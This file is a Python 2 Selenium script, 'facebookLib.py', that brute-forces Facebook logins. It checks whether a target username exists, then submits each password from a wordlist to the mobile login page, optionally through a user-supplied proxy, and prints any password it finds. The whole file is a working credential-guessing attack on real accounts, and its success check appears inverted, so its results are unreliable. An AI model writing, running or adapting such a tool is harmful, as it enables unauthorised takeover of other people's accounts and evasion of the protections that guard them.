# -*- coding: utf-8 -*-
# Proxy connections added by phant0m0day
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import *
import sys
reload(sys)
sys.setdefaultencoding('utf8')

''' facebookLib.py - Facebook bruteforce, seperate from mainLib to prevent any errors.
                      Comprises of a username checking method and actual bruteforce method. '''

R = '\033[31m'  # red
W = '\033[0m'  # white (normal)
G = '\033[32m'  # green
O = '\033[33m'  # orange

def facebookCheck(username):
    try:
        driver = webdriver.Firefox()
        driver.get("https://www.facebook.com/" + username)
        assert (("Sorry, this page isn't available.") not in driver.page_source)
        driver.close()
    except AssertionError:
        return 1


def facebookBruteforce(username, wordlist, delay):
    use = raw_input("[>] Use HTTPs proxy? [y/n]: ")
    if use == 'y':
        https_proxy = str(raw_input('[>] HTTPs proxy: '))
        proxy = Proxy({
            'proxyType': ProxyType.MANUAL,
            'httpProxy': https_proxy,
            'ftpProxy': '',
            'sslProxy': https_proxy,
            'noProxy': '',
        })
        driver = webdriver.Firefox(proxy=proxy)
    else:
        driver = webdriver.Firefox()
    driver.get("https://mbasic.facebook.com/login")
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            elem = driver.find_element_by_name("email")
            elem.clear()
            elem.send_keys(username)
            elem = driver.find_element_by_name("pass")
            elem.clear()
            elem.send_keys(password)
            elem.send_keys(Keys.RETURN)
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)
            assert (("Welcome to Facebook") in driver.title)
        except AssertionError:
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            sys.exit(0)
        except Exception, e:
            print R + "[!] OOPs, something went wrong. Did you terminate the connection? [!]" + W
            sys.exit(1)
